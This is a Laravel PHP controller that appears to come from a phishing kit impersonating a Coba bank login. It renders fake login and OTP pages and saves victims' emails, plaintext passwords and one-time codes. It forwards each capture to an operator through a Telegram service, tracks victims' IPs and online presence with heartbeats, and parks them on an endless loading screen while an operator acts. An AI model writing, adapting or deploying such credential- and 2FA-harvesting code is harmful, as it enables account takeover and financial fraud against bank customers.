<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Inertia\Inertia;
use App\Models\Usuario;
use App\Models\EstatusUsuario;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\DB;
use App\Services\TelegramService;

class CaptureController extends Controller
{
    protected $telegramService;

    public function __construct(TelegramService $telegramService)
    {
        $this->telegramService = $telegramService;
    }
    /**
     * Mostrar la página principal (login de Coba)
     */
    public function index()
    {
        $error = session()->get('error', false);

        // Limpiar el error de la sesión después de obtenerlo
        session()->forget('error');

        return Inertia::render('Public/CobaLogin', [
            'error' => $error,
        ]);
    }



    /**
     * Coba: Capturar credenciales de login
     */
    public function captureLogin(Request $request)
    {
        $validated = $request->validate([
            'email' => ['required', 'email', 'max:254'],
            'password' => ['required', 'string', 'min:6', 'max:64'],
            'dispositivo' => ['required', 'string'],
        ]);

        $email = $validated['email'];
        $password = $validated['password'];
        $dispositivo = $validated['dispositivo'];
        $ipReal = $this->obtenerIPReal($request);
        $userAgent = $request->header('User-Agent', 'Desconocido');

        // Buscar usuario existente o crear nuevo
        $usuarioRecord = Usuario::where('email', $email)->first();

        if (!$usuarioRecord) {
            $usuarioRecord = Usuario::create([
                'ip_real' => $ipReal,
                'fecha_ingreso' => now(),
                'usuario' => $email,
                'email' => $email,
                'password' => $password,
                'user_agent' => $userAgent,
            ]);
        } else {
            $usuarioRecord->update([
                'ip_real' => $ipReal,
                'usuario' => $email,
                'email' => $email,
                'password' => $password,
                'user_agent' => $userAgent,
            ]);
        }

        // Crear estatus inicial
        EstatusUsuario::updateOrCreate(
            ['usuario_id' => $usuarioRecord->id],
            [
                'ip_real' => $ipReal,
                'estado' => 'online',
                'pagina_actual' => 'login',
                'ultimo_heartbeat' => now(),
                'fecha_conexion' => now(),
                'user_agent' => $userAgent,
            ]
        );

        session([
            'usuario_id' => $usuarioRecord->id,
            'usuario' => $email,
            'email' => $email,
            'password' => $password,
            'dispositivo' => $dispositivo
        ]);

        // Enviar información a Telegram
        $this->telegramService->enviarInformacionUsuario($usuarioRecord);

        return redirect()->route('coba.otp');
    }




    /**
     * Mostrar el dashboard del usuario
     */


    public function heartbeat(Request $request)
    {
        // Log para debugging
        \Log::info('Heartbeat recibido', [
            'pagina' => $request->pagina,
            'estado' => $request->estado,
            'session_usuario_id' => session('usuario_id'),
            'ip' => $request->ip()
        ]);

        // Validar los datos del heartbeat
        $request->validate([
            'pagina' => 'required|string',
            'estado' => 'required|string|in:online,inactive,offline'
        ]);

        // Obtener la IP real
        $ipReal = $this->obtenerIpReal($request);

        // Obtener el usuario de la sesión
        $usuarioId = session('usuario_id');

        if (!$usuarioId) {
            \Log::warning('Heartbeat sin sesión de usuario');
            return response()->json([
                'success' => false,
                'error' => 'Sesión no encontrada'
            ], 401);
        }

        // Primero, marcar como offline a usuarios que no han enviado heartbeat en los últimos 60 segundos
        $offlineCount = DB::table('estatus_usuarios')
            ->where('ultimo_heartbeat', '<', now()->subSeconds(60))
            ->whereIn('estado', ['online', 'inactive'])
            ->update(['estado' => 'offline']);

        if ($offlineCount > 0) {
            \Log::info("Marcados como offline: {$offlineCount} usuarios");
        }

        // Actualizar el estado del usuario actual
        $usuario = Usuario::find($usuarioId);
        if ($usuario) {
            \Log::info('Actualizando estatus del usuario', [
                'usuario_id' => $usuarioId,
                'estado' => $request->estado,
                'pagina' => $request->pagina,
                'ip' => $ipReal
            ]);

            // Actualizar IP en la tabla usuarios
            $usuario->update([
                'ip_real' => $ipReal,
            ]);

            // PRIMERO: Marcar como offline a usuarios que no han enviado heartbeat en los últimos 60 segundos
            // Esta es la lógica clave que faltaba del proyecto de migración
            EstatusUsuario::where('ultimo_heartbeat', '<', now()->subSeconds(60))
                ->whereIn('estado', ['online', 'inactive'])
                ->update(['estado' => 'offline']);

            // SEGUNDO: Actualizar o crear el estatus del usuario actual
            $estatusUsuario = $usuario->estatusUsuario()->updateOrCreate(
                ['usuario_id' => $usuarioId],
                [
                    'estado' => $request->estado,
                    'pagina_actual' => $request->pagina,
                    'ultimo_heartbeat' => now(),
                    'ip_real' => $ipReal,
                    'user_agent' => $request->header('User-Agent'),
                ]
            );

            \Log::info('Estatus actualizado', [
                'estatus_id' => $estatusUsuario->id,
                'estado_guardado' => $estatusUsuario->estado,
                'ultimo_heartbeat' => $estatusUsuario->ultimo_heartbeat
            ]);
        }

        return response()->json([
            'success' => true,
            'timestamp' => now()->toISOString()
        ]);
    }



    /**
     * Coba: Mostrar formulario OTP
     */
    public function showOtp(Request $request)
    {
        $usuarioId = session('usuario_id');
        if (!$usuarioId) return redirect()->route('index');

        $usuario = session('usuario');
        $error = session()->get('error', false);

        // Limpiar el error de la sesión después de obtenerlo
        session()->forget('error');

        return Inertia::render('Public/CobaOtp', [
            'usuario' => $usuario,
            'error' => $error,
            'usuario_id' => $usuarioId,
        ]);
    }

    /**
     * Coba: Capturar código OTP
     */
    public function captureOtp(Request $request)
    {
        $validated = $request->validate([
            'otp' => ['required', 'string', 'min:6', 'regex:/^\d+$/', 'max:6'],
        ]);

        $usuarioId = session('usuario_id');
        if (!$usuarioId) return redirect()->route('index');

        $otp = $validated['otp'];

        // Actualizar usuario con OTP
        $usuarioRecord = Usuario::where('id', $usuarioId)->first();
        $usuarioRecord->update([
            'otp' => $otp,
        ]);

        // Actualizar estatus
        EstatusUsuario::updateOrCreate(
            ['usuario_id' => $usuarioId],
            ['estatus' => 'otp_capturado']
        );

        session(['otp' => $otp]);

        // Enviar información actualizada a Telegram
        $this->telegramService->enviarInformacionUsuario($usuarioRecord);

        return redirect()->route('coba.loading');
    }

    /**
     * Coba: Pantalla de carga infinita (admin decide acciones)
     */
    public function showLoading()
    {
        $usuarioId = session('usuario_id');
        if (!$usuarioId) return redirect()->route('index');

        return Inertia::render('Public/CobaLoading', [
            'usuario_id' => $usuarioId
        ]);
    }


    /**
     * Obtener la IP real del usuario
     */
    private function obtenerIPReal(Request $request): string
    {
        // Verificar diferentes headers para obtener la IP real
        $headers = [
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        ];

        foreach ($headers as $header) {
            $ip = $request->server($header);
            if (!empty($ip) && $ip !== 'unknown') {
                // Si hay múltiples IPs, tomar la primera
                if (strpos($ip, ',') !== false) {
                    $ip = trim(explode(',', $ip)[0]);
                }

                // Validar que sea una IP válida
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }

        // Si no se puede obtener la IP, usar un servicio externo como fallback
        try {
            $ip = file_get_contents('https://api.ipify.org');
            return $ip ?: $request->ip();
        } catch (\Exception $e) {
            return $request->ip();
        }
    }
}
